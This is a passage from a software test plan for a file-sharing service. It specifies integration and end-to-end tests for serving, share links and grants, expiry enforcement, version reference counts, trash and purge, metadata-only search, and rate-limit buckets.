`Content-Type` of the 404 page is `text/html` — but the test asserts the body is the error page,
so a client asking for JSON is not silently handed an app shell. §6.6.1.

**T-SERVE-05 — the listing page.** *e2e.* `GET /` on `bundle_noentry`. **Expect:** `200`, an
HTML listing with one row per file showing name, size, and type, links that work, inline CSS
only (**zero external subresource requests**, asserted in a headless browser), and
`Cache-Control: no-store`. The listing shows only this artifact's files and never a sibling
artifact's name. §6.6.2.

**T-SERVE-06 — content-type table.** *Unit + e2e.* Every row of §6.6.3, plus an extension not in
the table → `application/octet-stream` with `Content-Disposition: attachment`. Explicit
`contentType` wins except where §6.6.3's coercion applies (covered by T-SEC-06).

**T-SERVE-07 — cache-control matrix.** *e2e.* Owner → `private, max-age=300`; grantee →
`private, max-age=300`; through a link → `private, no-store`; a filename containing a content
hash (`app.4f2a9c1e.js`) → `private, max-age=31536000, immutable`; listing and error pages →
`no-store`. **Every** response contains `private` and none contains `public` or `s-maxage` —
asserted by sweeping 200 responses of all kinds. §6.6.5.

**T-SERVE-08 — precompression.** *e2e.* A 50 KB CSS file gets `.br` and `.gz` siblings after the
worker runs; a request with `Accept-Encoding: br` returns `Content-Encoding: br` and the brotli
bytes; with no `Accept-Encoding`, the raw bytes. A 500-byte file and an 11 MB file get **no**
siblings (outside the 1 KB–10 MB window). A PNG, an MP4, and a PDF never get siblings. §3.5.

**T-SERVE-09 — range requests.** *e2e.* Against the 12 MB MP4: a single range → `206` with
`Content-Range` and exactly the requested bytes; an open-ended range; a suffix range
(`bytes=-1000`); a multipart range → `206` `multipart/byteranges`; an unsatisfiable range →
`416`; `If-Range` with a matching and a non-matching `ETag`. Assert `/internal/authorize` ran
**once per request** (recorder count) and that the byte serving did not pass through the API.
§6.6.4.

**T-SERVE-10 — video is never opened.** *Integration.* Post the MP4 and read every artifact and
version response. **Expect:** no `duration`, `width`, `height`, `codec`, or thumbnail anywhere;
no `.jpg` sibling on disk; the read counter for the blob is zero outside serving. §6.6.4, P5.

**T-SERVE-11 — the authorize contract.** *Integration.* Call `/internal/authorize` directly over
the socket for each outcome: authorised → `200` with `X-Share-File` in `ab/cd/<64 hex>` form
plus the optional headers; password needed → `401` with the gate body; unknown/no access/expired
/missing → `404`; rate limited → `429`; API unhealthy (dependency killed) → `503`. Assert an
**empty** optional header value causes Caddy to omit the header rather than emit an empty one
(e2e). §2.4.1.

**T-SERVE-12 — the resolution cache and its invalidation.** *Integration.* Resolve to warm
`sh:res:{space}:{name}`. Repost, rename, trash, restore, and change `entry_path`; after each,
the next request reflects the change **immediately** with the clock frozen, and the key is
absent from Redis. Then assert a 60 s TTL exists on the key when nothing has changed. §2.4.2.

**T-SERVE-13 — manifest cache immutability.** *Integration.* Warm `sh:man:{versionId}`. Assert
the key's TTL is ~600 s and that no code path ever writes a different value for the same version
ID — versions are immutable, so the test mutates `version_file` directly in SQL and asserts the
application never does so itself (statement-log assertion). §2.4.2.

**T-SERVE-14 — maintenance page.** *e2e.* Stop the API. **Expect:** artifact paths return `503`
served **by Caddy** from a static file with no application involvement; `/internal/ready`
returns `503` with a `checks` object when Postgres or Redis is down; the maintenance page
contains no artifact names. §2.4.1, §2.8.

**T-SERVE-15 — negative trio for the serving surface.** *e2e.* Permission: a stranger → `404`
(T-PRIV-01). Limit: 601 requests to one artifact from one IP in a minute → `429` with
`Retry-After`, bucket `serve_ip`, and the signed-in owner getting ten times that before
throttling; 3,001 requests through one link in an hour → bucket `serve_link`. Malformed: an 8 KB+
URL → `414`/`404`; a request with a NUL in the path; a `Range` header of `bytes=abc`. §10.2.3.

## 14.9 T-SHARE — links, grants, and the access matrix

**T-SHARE-01 — the full who-can-see-what matrix.** *e2e, `@security`. Verifies §6.5, §7.1,
§7.7, §8.4, §8.5, P7.*
- **Pre:** the eight sharing-state fixtures of §14.2.8, each a bundle with `/index.html` and
  `/style.css`. Five actors: **O** (owner, session), **G** (grantee `user_b`, session), **R+**
  (recipient holding the *correct* link for that artifact, unlocked if it has a password), **R−**
  (recipient holding a *different* artifact's live link, presenting that link's cookie and
  token), **S** (stranger: no credential, and separately a signed-in `user_c`).
- **Steps:** For every (actor, state) cell, request the artifact root, `/style.css`, a missing
  path, and — for R+/R− — the same through `/s/{token}/…`. 40 cells × 4 requests, table-driven.
- **Expect:** exactly this, with no cell left to implementation discretion.

| State ↓ / Actor → | O | G | R+ | R− | S |
| --- | --- | --- | --- | --- | --- |
| `private` | 200 | 404 | n/a | 404 | 404 |
| `granted` (to G) | 200 | 200 | n/a | 404 | 404 |
| `link` | 200 | 404 | 200 via `/s/…` | 404 | 404 |
| `link_pw`, not unlocked | 200 | 404 | 401 gate | 404 | 404 |
| `link_pw`, unlocked | 200 | 404 | 200 via `/s/…` | 404 | 404 |
| `link_expired` (sweep not run) | 200 | 404 | 410 on `/s/{t}`, 404 elsewhere | 404 | 404 |
| `link_revoked` | 200 | 404 | 410 on `/s/{t}`, 404 elsewhere | 404 | 404 |
| `trashed` | 404 at its URL, visible only in `?trashed=true` | 404 | 410 on `/s/{t}` | 404 | 404 |
| `ttl_expired` (sweep not run) | 404 at its URL | 404 | 410/404 | 404 | 404 |

  Additional assertions across the whole matrix: every `404` body is byte-identical to
  T-PRIV-01's; the only `410`s are on `/s/{token}` entry pages and their bodies name no
  artifact, owner, title, or type (§7.6); no response to G, R+, R−, or S carries
  `X-Share-Artifact`; and the owner's own `404` on a trashed artifact is identical to a
  stranger's, so the owner's URL does not leak trash state to a bystander sharing their screen.

**T-SHARE-02 — link creation.** *Integration.* With `tok_sharer`: `POST
/artifacts/postcal/links` with `{ttl:"14d", password:true, label:"Fairfield listing team"}` →
`201` with `id`, `url` matching `https://share.test/s/[1-9A-HJ-NP-Za-km-z]{22}`, `expiresAt`
exactly now + 14 d, `hasPassword:true`, `password` matching
`^[a-z]+-[a-z]+-[0-9]{2}$`, `label`, and `artifact:{name,title}`. The database stores only
`sha256(token)` and an argon2id `password_hash` — assert the raw token appears in **no** column
and the password hash starts with `$argon2id$v=19$m=65536,t=3,p=1$`. §7.3, §7.4.

**T-SHARE-03 — the password is returned exactly once.** *Integration.* After creation, `GET
/artifacts/{n}/links`, `GET /artifacts/{n}`, `PATCH /links/{id}`, `GET /api/v1/audit`, and the
MCP `share_get` all return `hasPassword: true` and **never** a `password` field. Setting a new
password returns nothing readable back either — only the caller-supplied value. §7.3.

**T-SHARE-04 — token entropy and format.** *`@real_entropy`, unit.* 10,000 tokens: 22 characters,
base58 alphabet only (no `0`, `O`, `I`, `l`), ≥ 128 bits when decoded, zero collisions,
uniform position distribution. §7.3.1.

**T-SHARE-05 — the password gate works without JavaScript.** *e2e.* Fetch `/s/{t}` with a client
that executes no script. **Expect:** `401`, an HTML form with `method="post"` and
`action` ending `/unlock`, `enctype` form-encoded, a `Set-Cookie: share_c=<challenge>`, and no
`<script>` tag in the body. Submitting form-encoded → `303` to `/s/{t}/`. Submitting the same
credentials as JSON also → `303`. The gate names no artifact, owner, title, size, or type
(§7.6) — asserted by checking the body against the artifact's title, name, and ID. §7.4.

**T-SHARE-06 — recipient cookie shape.** *e2e.* After unlock: `Set-Cookie:
share_r_<first 8 chars of token>=<id>.<hmac>; HttpOnly; Secure; SameSite=Lax;
Path=/s/<full token>; Max-Age=86400`. Assert `Max-Age` is clamped to the link's remaining
lifetime when that is under 24 h. Assert the cookie name derives from the token's first 8
characters exactly, so three links yield three cookie names. §4.7.

**T-SHARE-07 — assets load under the link path.** *e2e.* Load `/s/{t}/` in a headless browser
for a bundle whose HTML references `style.css`, `img/chart.png`, and an absolute `/style.css`.
**Expect:** the relative references resolve to `/s/{t}/style.css` and `/s/{t}/img/chart.png` and
return `200`; the absolute `/style.css` resolves to the site root and returns `404` (it is not
the recipient's artifact) — documented behaviour, and the reason the docs tell agents to use
relative links. At no point does any URL in the network log contain the artifact's name, the
owner's handle, or an `art_`/`ver_` ID. §7.6.

**T-SHARE-08 — revocation is immediate and cache-independent.** Covered by T-PRIV-09; this case
adds the API side: after `DELETE /links/{id}`, `GET /artifacts/{n}` shows `shareLinks: []` and
`visibility` reverting to `private` or `granted`, `GET /artifacts/{n}/links` omits it, and a
second `DELETE` → `404 link_not_found`. §7.4, §7.8.

**T-SHARE-09 — a link survives a rename.** *e2e.* Create a link on `postcal`, fetch through it,
then `PATCH` the name to `q4/calendar`. **Expect:** the link URL is unchanged and still `200`s;
the served content is the same; `/postcal` now `404`s and `/q4/calendar` `200`s for the owner;
the recipient's requests never reveal either name. Then rename again during a live recipient
session — the recipient's next request succeeds without re-unlocking. §7.2, §5.3.

**T-SHARE-10 — a link follows a content overwrite.** *e2e.* Recipient fetches v1 through a link.
Owner posts v2 with different bytes. **Expect:** the recipient's next request serves **v2**
without any new credential, and `Cache-Control: private, no-store` on the earlier response means
the browser did not retain v1 (asserted by a second browser fetch showing v2). The artifact
screen response lists the live link, which is the §7.2 mitigation, so `GET /artifacts/{n}`
after the overwrite still shows `shareLinks[0].id`. §7.2.

**T-SHARE-11 — trashing revokes links and grants; restore does not restore them.**
*Integration.* Artifact with 2 live links and 1 grant. `DELETE /artifacts/{n}`. **Expect:** both
links have `revoked_at` set, all recipient sessions deleted, the grant `revoked_at` set, the
grantee's `?shared=true` no longer lists it, and every link is `410`. Then `POST
/artifacts/{n}/restore`. **Expect:** the artifact serves again to the owner; `share_link` rows
remain revoked; `share_grant` remains revoked; `GET /artifacts/{n}` shows `shareLinks: []`,
`grants: []`, `visibility: private`; the old link URLs are still `410`. A `link.revoke` /
`grant.revoke` audit row exists for each with `actor_type='user'`, and **no** `link.create` row
appears on restore. §5.11, §8.4.

**T-SHARE-12 — extending never shortens.** *Integration.* A link expiring in 10 d, extended by
`"7d"` → `expiresAt` becomes original + 7 d = 17 d out, **not** now + 7 d. Extending a link
expiring in 1 h by `"14d"` → 14 d + 1 h out. Extending past `SHARE_MAX_SHARE_TTL` measured from
creation → `422 ttl_too_long`. A `link.update` audit row with both old and new expiry in
`metadata`. §7.4.

**T-SHARE-13 — `maxViews` burns the link.** *Integration.* `max_views: 2`. Three distinct
viewer-days consume it. **Expect:** the third is `410`; the second still `200`; the counter
counts **distinct viewer-days**, not requests — a single viewer loading 40 assets increments it
once (asserted by loading a 40-file bundle and checking `view_count` moved by 1). See §14.24
ambiguity A4. §7.3, §10.6.

**T-SHARE-14 — grants.** *Integration.* `POST /artifacts/deck/grants {handle:"sarah"}` → `201`,
a `share_grant` row, `grant.create` audited. Sarah's `?shared=true` lists it with
`owner:{handle:"robert", isSelf:false}`. She reaches it at `/~robert/deck` signed in. She can
`GET` files/content and `POST copy`; she cannot `PATCH`, `DELETE`, `POST links`, `POST grants`,
`POST versions/{id}/restore`, or see anything else in Robert's space (`403 not_your_artifact` on
the ULID forms, `404` on name forms). `DELETE /grants/{id}` → her next request is `404`, with
the clock frozen and no cache flush. §7.7.

**T-SHARE-15 — grant edge cases.** *Integration.* Grant to a handle that does not exist →
`404 user_not_found`; to yourself → `409 cannot_grant_to_self`; twice → `409 grant_exists`;
re-granting after a revoke → succeeds with a new `grn_` ID; granting a trashed artifact →
`422 artifact_trashed`; granting with `tok_agent` → `403 insufficient_scope` naming
`share:create`. §7.10, §7.9.

**T-SHARE-16 — derived visibility.** *Integration.* Parameterised over all four combinations of
{live links: 0, 1} × {live grants: 0, 1}: `private`, `granted`, `shared`, and — with both —
`shared` (the widest wins, §7.8). Revoking the last link with a grant still live flips back to
`granted`. An **expired but not yet swept** link counts as **not live**, so visibility is
`private` — this is the case where the derived field and the raw row disagree, and the derived
value must follow the inline check, not `revoked_at`. §7.8, §7.5.

**T-SHARE-17 — the owner is notified whenever something becomes reachable.** *Integration.*
Creating a link with `settings.notifyOnShare` at its **default** → one `link_created` email
naming the artifact, the expiry in absolute UTC, and whether a password was set. Turning the
setting off suppresses it. The first-ever link created by a given token additionally fires
`first_link_by_token` (§10.4) even when `notifyOnShare` is off. §7.3, §10.8.

**T-SHARE-18 — negative trio for the sharing surface.** *Integration.* Permission: `tok_agent`
→ `403 insufficient_scope`; `user_c` on `user_b`'s artifact → `404`/`403 not_your_artifact`.
Limit: 21 links in an hour → `429`, `detail.bucket == "link_create"`, **and** an immediate owner
notification (§10.2.1); 61 grants in an hour → bucket `grant`. Malformed: `password: "short"` →
`422 password_too_short`; `password: 12345` (wrong type); `ttl: "1y"`; `maxViews: -1`;
`maxViews: "many"`; a 10 KB `label`. §14.1.3.

## 14.10 T-EXP — expiry, everywhere

**T-EXP-01 — expiry is enforced, not merely recorded.** *Integration.* Create a link with a
30-minute TTL. Assert `expires_at` is non-null and equals creation + 30 min. §7.1, P4.

**T-EXP-02 — a link is dead the second after expiry, before the sweep runs.** *e2e,
`@security`. **This is the test cited by §7.5.***
- **Pre:** a live link L on `postcal`, `expires_at = T`. A recipient has already fetched
  `/s/{t}/` and `/s/{t}/style.css`, so `sh:tok:{sha}`, `sh:res:*`, and `sh:man:*` are all warm.
  The worker is **not** running; the expiry sweep is invoked explicitly by tests only.
- **Steps:** Advance the injected clock to `T + 1 second`. Do **not** run the sweep. Do **not**
  flush Redis. Immediately request `/s/{t}/`, `/s/{t}/style.css`, `/s/{t}/img/chart.png`, and
  `POST /s/{t}/unlock` with the correct password.
- **Expect:** `410 link_expired` on the entry page; `404 not_found` on the two asset paths;
  `410` on `/unlock`. Then assert the enforcement is genuinely inline: `SELECT revoked_at FROM
  share_link WHERE id = …` **is still NULL** and the Redis key `sh:tok:{sha}` is **still
  present** with its cached value — the row says live, the cache says live, and the request is
  still refused, because `/internal/authorize` compares `expires_at` to the clock on every
  request (§7.5). Finally run the sweep and assert `revoked_at` is now set, recipient sessions
  are deleted, `link.expired` is audited with `actor_type='system'`, and a `link_ended` email
  fired — bookkeeping catching up to an enforcement that had already happened.

**T-EXP-03 — the sweep.** *Integration `@commit_required`.* Ten links, six past expiry. Run the
5-minute sweep. **Expect:** exactly six updated, `RETURNING` the six IDs; recipient sessions for
those six deleted; `sh:tok:` keys purged; six `link.expired` audit rows; six `link_ended` emails
and no seventh. Re-running is a no-op producing zero rows and zero emails. §7.5.

**T-EXP-04 — the 24-hour warning.** *Integration.* A link expiring in 23 h 50 m. Run the hourly
job. **Expect:** one `link_ending` email containing a one-click extend URL that, when followed
by the signed-in owner, extends the link and is single-use. Running the job again within the
same window sends **no** second email (idempotency asserted). A link expiring in 30 h gets
nothing. §7.5, §10.8.

**T-EXP-05 — links expiring within 48 h surface in the dashboard payload.** *Integration.*
`GET /api/v1/artifacts` and the dashboard's banner endpoint include links expiring within 48 h
and exclude those beyond. §7.5, §11.5.

**T-EXP-06 — artifact TTL moves the artifact to the trash.** *Integration.* `ttl: "30d"`. Advance
30 d + 1 min, run the 15-minute sweep. **Expect:** `trashed_at` set, **not** `deleted_at`; the
artifact appears in `?trashed=true`; it is restorable; `artifact.ttl_expired` audited; its
storage still counts against quota (§8.4); its links and grants are revoked exactly as a manual
trash would. Advance a further 30 d and run the nightly trash job → hard deleted. §8.5.

**T-EXP-07 — artifact TTL is enforced inline too.** *e2e.* Advance past `ttl_expires_at` without
running the sweep. **Expect:** `404` at the artifact URL for the owner and everyone else, with
`trashed_at` still NULL in the row. §8.5, §6.5.

**T-EXP-08 — TTL notification only when it matters.** *Integration.* An artifact with a TTL and a
live link, 24 h out → one `artifact_ttl_ending` email. An artifact with a TTL and no link or
grant → **no** email. Setting a TTL on an artifact that already has live links returns a
`ttl_with_live_links` warning in the response. §8.5.

**T-EXP-09 — a recipient session never outlives its link.** *Integration.* Link expiring in 3 h;
unlock. **Expect:** `recipient_session.expires_at == link.expires_at`, not now + 24 h. At
T+3h+1s the cookie is refused. §4.7.

**T-EXP-10 — upload session expiry.** Covered by T-POST-21; this case adds the boundary: at
`expires_at − 1 s` a `PUT` succeeds and at `expires_at + 1 s` it is `403
upload_signature_invalid`, and a commit at `+1 s` is `409 upload_session_expired`. §5.7.

**T-EXP-11 — invite expiry.** *Integration.* An invite at 7 d − 1 min accepts; at 7 d + 1 min →
`410 invite_expired` and the handle is released for reuse. §4.8.

**T-EXP-12 — token expiry.** *Integration.* A token with `expires_at` in the past →
`401 invalid_token`, identical body and timing to an unknown token (T-AUTH-07). §4.6.

**T-EXP-13 — WebAuthn challenge TTL.** *Integration.* A challenge used at 299 s succeeds; at
301 s the Redis key is gone and the finish is `401 webauthn_verification_failed`. §3.3.

## 14.11 T-VER — versions and reference counts

**T-VER-01 — version listing and diffing.** *Integration.* Five versions with known manifest
changes. **Expect:** `items` in descending `seq` with `isLive` true on exactly one,
`changes:{added,modified,removed}` computed against the **preceding** version and correct for
each — including a rename-shaped change (one removed, one added) and a content change at the
same path (one modified). The diff is cached 24 h; mutating a cached diff's inputs and
re-reading within the window returns the cached value, and after 24 h it recomputes. §8.2.

**T-VER-02 — restore carries content, not sharing.** *Integration.* Artifact at seq 3 with two
live links, one grant, a title, tags, a TTL, `pinned: true`, and `entryPath: /a.html`. Version 1
had `entryPath: /index.html` and a different file set. Restore version 1. **Expect:** a **new**
version at **seq 4** (history append-only); its manifest equals v1's exactly; `entry_path`
becomes `/index.html` (carried); **name, title, description, tags, TTL, and pinned are
unchanged**; **both links remain live with the same tokens and expiries and now serve v1's
content**; the grant remains live. Assert `share_link` rows were not touched at all (row
`updated`-free, no `link.*` audit rows). A `version.restore` audit row. §8.2.

**T-VER-03 — restore moves no bytes.** *Integration.* Measure disk usage and the `file` table
before and after a restore of a 40 MB version. **Expect:** identical byte count on disk, zero
new `file` rows, `ref_count` incremented once per `version_file` row created, and the call
completes in under 1 s (§14.20). §8.2.

**T-VER-04 — the live version cannot be deleted.** *Integration.* `DELETE
/artifacts/{n}/versions/{live}` → `409 version_is_live`, nothing changed. Deleting a non-live
version soft-deletes it (`deleted_at`), removes it from listings, makes preview `409
version_deleted`, and hard-deletes it after the trash window, at which point its exclusive files
become collectable. §8.2.

**T-VER-05 — version preview.** *Integration.* `/~/artifacts/{n}/versions/{id}/preview` streams
files **through the API** for the signed-in owner. **Expect:** `200` for the owner; `404` for a
grantee, a recipient, and a stranger; no public path ever mounts a non-live version (assert
`/{name}` and `/s/{t}/` always serve the live version even while a preview is open); no preview
token or per-version hostname exists in the URL space. §8.2.

**T-VER-06 — restore with a purged file.** *Integration.* Force-collect a file that only version
2 references (by purging every other referent), then restore version 2 → `422
restore_files_missing` naming the paths, nothing mutated. §8.9.

**T-VER-07 — retention pruning.** *Integration.* 30 versions, `keepLast:20`, `keepDays:365`,
`keepPinned:true`, `minimum:3`. Advance so 25 are older than 365 d, pin version 2. Run the
nightly prune. **Expect:** the 20 most recent kept, version 2 kept (pinned), the live version
kept regardless, and never fewer than 3 remaining under any setting combination — including the
adversarial config `keepLast:0, keepDays:0, keepPinned:false`, where `minimum:3` still holds and
the live version survives. §8.3.

**T-VER-08 — reference counts are exactly correct, always.** *Integration `@commit_required`,
the reconciliation test.* A scripted sequence of ~40 operations in one run: post, repost, post a
duplicate file under a second name, copy, restore a version, delete a version, trash, restore,
purge, prune, run collection, post again reusing a collected hash, bundle-upload, abandon a
session, expire it, and commit concurrently. **After every single step**, run a brute-force
reconciliation:

```sql
SELECT f.sha256, f.ref_count, (SELECT count(*) FROM version_file vf WHERE vf.sha256 = f.sha256)
FROM file f;
```

**Expect:** `ref_count` equals the counted rows for **every** file after **every** step — no
drift, not even transiently observable from another connection after commit. Additionally assert
that the set of blobs on disk equals the set of `file` rows, and that every `version_file.sha256`
has a `file` row and a blob. §3.6.

**T-VER-09 — a drifted counter never deletes live data.** *Integration `@commit_required`.*
Corrupt `ref_count` to `0` and `-5` for two files that **are** referenced, and to `7` for a file
that is not. Backdate `last_ref_at` past 24 h. Run collection. **Expect:** the two referenced
files survive — the `NOT EXISTS (SELECT 1 FROM version_file …)` clause is authoritative (§3.6) —
and are still served; the over-counted unreferenced file is **not** collected (its `ref_count >
0` excludes it), which the test records as expected conservative behaviour and which
`sharectl recompute-refs` fixes. §3.6, §14.24 ambiguity A8.

**T-VER-10 — collection respects the grace window and the lock.** *Integration
`@commit_required`.* An unreferenced file with `last_ref_at` 23 h ago is **not** collected; at
25 h it is. A file that an open upload session is about to reference is not collected even at
25 h (the session's pending set is checked, and the row lock plus grace window make the race
impossible — asserted by running collection concurrently with a commit 20 times and checking no
commit ever fails with a missing file). Collection is bounded at 5,000 per run and logs a
summary; a sixth-thousandth file waits for the next run. §3.6.

**T-VER-11 — pinning.** *Integration.* `POST /versions/{id}/pin` and unpin; pinned versions
survive pruning; pinning the live version is allowed and is a no-op for retention. `version.pin`
audited. §8.2, §8.3.

**T-VER-12 — negative trio for the version surface.** *Integration.* Permission: `tok_ro` on
`restore`/`pin`/`DELETE` → `403 insufficient_scope`; another user's version ULID →
`404 version_not_found`. Limit: restoring in a loop counts against the `post` bucket → `429`.
Malformed: a `versionId` with the wrong prefix (`art_…`), a non-ULID, a version belonging to a
different artifact → `404 version_not_found` in every case (never a cross-artifact restore).
§8.9.

## 14.12 T-TRASH — trash, restore, purge

**T-TRASH-01 — trashing.** *Integration.* `DELETE /artifacts/postcal`. **Expect:** `trashed_at`
set, `deleted_at` NULL; the URL `404`s for everyone including the owner; absent from
`GET /artifacts`, from search, and from `?shared=true` for grantees; present only in
`?trashed=true`; `artifact.trash` audited. §8.4.

**T-TRASH-02 — the name is held while trashed.** *Integration.* After trashing `postcal`, posting
a new artifact named `postcal` → `409 name_taken`, with a message that says the name is in the
trash (asserted for the code, not the wording). Renaming another artifact to `postcal` → `409
name_taken`. After purging or after the 30-day empty, the name becomes available and a post
succeeds. §5.3, §8.4.

**T-TRASH-03 — restore.** *Integration.* `POST /artifacts/postcal/restore` → `trashed_at` NULL,
the URL serves again, all versions intact, `artifact.restore` audited. Restoring something not
trashed → `409 artifact_not_trashed`. Restoring when the name was somehow reused → `409
name_taken` (reachable only after a purge race; the test constructs it directly). §8.4, §8.9.

**T-TRASH-04 — trashed storage still counts.** *Integration.* Trash an artifact; assert
`app_user.storage_bytes` is unchanged after the dirty-set drain, and that the trash screen's
figure equals the summed unique bytes of trashed artifacts. §8.4.

**T-TRASH-05 — the 30-day empty.** *Integration `@commit_required`.* Trash at T. Run the nightly
job at T+29 d → nothing. At T+30 d + 1 min → rows hard-deleted, `version_file` gone, ref counts
dropped, `system.trash_empty` audited. Run collection the next night → exclusive bytes gone. The
whole cycle completes within 31 days, which the test asserts as a date arithmetic property.
§3.6, §8.4.

**T-TRASH-06 — purge needs the separate scope.** *Integration.* `DELETE /artifacts/{n}?purge=true`
with `tok_agent` → `403 insufficient_scope`, `detail.scope == "artifacts:delete"`; with
`tok_deleter` → success, skipping the trash entirely, `artifact.purge` audited. §8.4, §4.6.1.

**T-TRASH-07 — an agent with default scopes provably cannot permanently delete anything.**
*Integration, `@security`.* With `tok_agent`, attempt permanent destruction by **every** route
the API offers: `?purge=true`; `DELETE` twice in a row on the same artifact; `DELETE` on an
already-trashed artifact; `DELETE /versions/{id}` on every version including the live one; a
`PATCH` setting `ttl` to a past timestamp; a `PATCH` setting `ttl: "0s"`; posting 200 versions to
force retention pruning below the floor; trashing and immediately restoring in a loop; setting
`deleted_at` via any body field; and `DELETE /api/v1/files/{sha}` if such a route exists (it must
not — asserted against the route table). **Expect:** after the whole sweep, every artifact is
either live or restorable from the trash, every `file` row still exists, and the byte count on
disk is unchanged. The only state an agent-default token can reach is "in the trash". §8.4,
§7.9.

**T-TRASH-08 — purge is the P8 path.** Cross-reference: T-PRIV-08 is the authoritative case.
This entry exists so the trash area's coverage report names it. §3.6.

**T-TRASH-09 — negative trio for the trash surface.** *Integration.* Permission: another user's
artifact → `404`. Limit: purging in a loop counts against the `api` bucket. Malformed:
`?purge=yes`, `?purge=1`, `?purge=TRUE` → assert the parser accepts exactly `true`/`false` and
`422`s otherwise, because a lenient boolean parser here is a permanent-deletion footgun. §14.1.3.

## 14.13 T-SEARCH — metadata-only search

**T-SEARCH-01 — content is unfindable, proven by construction.** *Integration, `@security`.
Verifies P5, §8.7.*
- **Pre:** post four artifacts with **no** title and no tags: a PDF whose text contains
  `zygomatic-tulip-oscilloscope`, an HTML file containing that phrase in a `<h1>`, a `.txt`
  containing it, and a `.docx` containing it. Also post one artifact **named**
  `zygomatic-tulip` for a positive control.
- **Steps:** `GET /api/v1/artifacts?q=` for each of: the full phrase, each word, a two-word
  prefix, a misspelling, and an uppercase variant. Also run the same through MCP `share_list`,
  the CLI `share search`, and the dashboard search endpoint.
- **Expect:** the four content-bearing artifacts are returned by **none** of the queries through
  **any** surface. The positive control is returned for `zygomatic`, `zygomatic-tulip`,
  `zygomatik` (trigram), and `ZYGOMATIC`. Additionally assert no table, index, or column in the
  schema stores artifact text — enumerate `information_schema.columns` and assert none is a
  `tsvector`, and that `pg_trgm` indexes exist only on `artifact.name` and `artifact.title`.

**T-SEARCH-02 — `q` matches name, title, description, and tags.** *Integration.* Four artifacts,
each carrying the token `marmot` in exactly one of those four fields. **Expect:** all four
returned for `q=marmot`; an artifact with `marmot` only in a filename is not. §8.7.

**T-SEARCH-03 — ranking order.** *Integration.* Seed: exact name `report`, name prefix
`report-q3`, name trigram `reprot-old`, title match, description match, tag match. **Expect:**
result order exactly: exact name, name prefix, name trigram, title, description — with the tag
match boosted above a description-only match at equal similarity. Assert the ordering is stable
across runs and is produced by a single SQL expression (statement-log assertion: one query, no
application-side re-sort). §8.7.

**T-SEARCH-04 — filters.** *Integration.* Parameterised over `tag` (repeatable, ANDed), `kind`
(all six values), `owner`, `createdBefore/After`, `updatedBefore/After`, `hasLink`, `token`,
`trashed`, `shared`, `pinned`, and all five `sort` values. Each asserts the exact expected ID
set. An unknown filter or sort → `422 invalid_filter`. `owner=sarah` from `user_c` returns only
artifacts granted to `user_c`, never Sarah's private ones. §8.7.

**T-SEARCH-05 — search is scoped, with no instance-wide escape.** *Integration, `@security`.*
As the **root** user, search for a term that matches only `user_b`'s private artifact, with and
without `scope=instance`, `owner=sarah`, `all=true`, and every other parameter combination.
**Expect:** never returned. Root has no cross-space search — asserted against the route's
parameter model so adding one fails the test. §8.7, P7.

**T-SEARCH-06 — pagination.** *Integration.* 250 artifacts. `limit=50` walks the whole set with
`nextCursor`, `hasMore` correct, no duplicates, no omissions, stable under a concurrent insert
(the new item appears at most once). `limit=201` → `422`; `limit=0` → `422`; an `offset`
parameter → `422 invalid_filter` (offsets are unsupported everywhere, §5.1.2); a cursor from a
different user → returns that user's own first page, never a cross-space leak. §5.1.2.

**T-SEARCH-07 — trashed and shared switches.** *Integration.* `?trashed=true` returns only
trashed artifacts and never mixes them into the default listing; `?shared=true` returns only
granted-to-me and marks `owner.isSelf: false`. Combining both → `422 invalid_filter`. §8.7.

**T-SEARCH-08 — negative trio for search.** *Integration.* Permission: unauthenticated → `401`.
Limit: 301 searches in an hour → `429`, bucket `search`. Malformed: `q` of 10 KB, `kind=widget`,
`sort=random`, `createdAfter=notadate`, `tag` with 40 repetitions → `422` with
`detail.fields`. §10.2.1.

## 14.14 T-LIMIT — rate limits, quotas, ceilings

**T-LIMIT-01 — every registered bucket has a test.** *Unit.* Import
`share.limits.BUCKETS` — the single registry every limiter reads — and assert its key set equals
the union of §10.2.1, §10.2.2, and §10.2.3 exactly (22 names). Then walk the test suite for the
`@bucket("name")` marker and assert every registered bucket is claimed by at least one test.
**Adding a bucket without a test fails the build; removing one from the spec without removing it
from the registry also fails.** The mapping is:

| Bucket | Test | Bucket | Test |
| --- | --- | --- | --- |
| `api` | T-LIMIT-04 | `webauthn_begin` | T-AUTH-19 |
| `api_ip` | T-LIMIT-04 | `webauthn_finish` | T-AUTH-19 |
| `post` | T-LIMIT-05 | `token_auth_fail` | T-LIMIT-13 |
| `post_token` | T-LIMIT-05 | `device_start` | T-LIMIT-23 |
| `upload` | T-LIMIT-06 | `device_poll` | T-AUTH-12 |
| `bundle` | T-LIMIT-07 | `recovery_use` | T-AUTH-14 |
| `link_create` | T-LIMIT-08 | `recovery_use_ip` | T-AUTH-14 |
| `grant` | T-LIMIT-09 | `link_password` | T-LIMIT-14 |
| `search` | T-LIMIT-10 | `link_password_link` | T-LIMIT-14 |
| `invite` | T-LIMIT-11 | `serve_ip` | T-LIMIT-15 |
| `copy` | T-LIMIT-12 | `serve_link` | T-LIMIT-16 |

**T-LIMIT-02 — token-bucket arithmetic.** *Unit.* For a bucket of 600/min with burst 100: 100
immediate requests succeed; the 101st in the same instant is refused; after 100 ms exactly 1
token has refilled (600/min = 10/s) and one request succeeds; a sustained 700/min is refused
~100 times per minute while a sustained 599/min never is. Assert continuous refill, not
fixed-window resets, by showing no cliff at the minute boundary. Clock-driven, no sleeps. §10.2.

**T-LIMIT-03 — every `429` carries its metadata.** *Integration.* Trip each of the 22 buckets and
assert on **every** response: status `429`, `code == "rate_limited"`, `detail.bucket` equal to
the registry name, and headers `Retry-After` (integer seconds, > 0), `X-RateLimit-Limit`,
`X-RateLimit-Remaining` (`0`), `X-RateLimit-Reset` (a future epoch second). Sleeping
`Retry-After` seconds on the injected clock makes the next request succeed. §10.2.

**T-LIMIT-04 — `api` and `api_ip`.** *Integration.* 601 API calls in a minute from one token →
`429` bucket `api`. Then, from one IP with **six different tokens**, 1,201 calls → `429` bucket
`api_ip` while each individual token is still under its own limit — proving the two buckets are
independent and both enforced. §10.2.1.

**T-LIMIT-05 — `post` and `post_token`.** *Integration.* 121 declares from one token → bucket
`post_token`. Then from three tokens of one user, 241 declares in an hour → bucket `post` while
no single token has exceeded 120. §10.2.1.

**T-LIMIT-06 — `upload` concurrency.** *Integration.* 17 simultaneous `PUT`s on one session →
the 17th is `429 too_many_uploads` with `Retry-After`; completing one frees a slot; 16 in
parallel across **two** sessions of the same user both succeed (the subject is the session).
§5.4, §10.2.1.

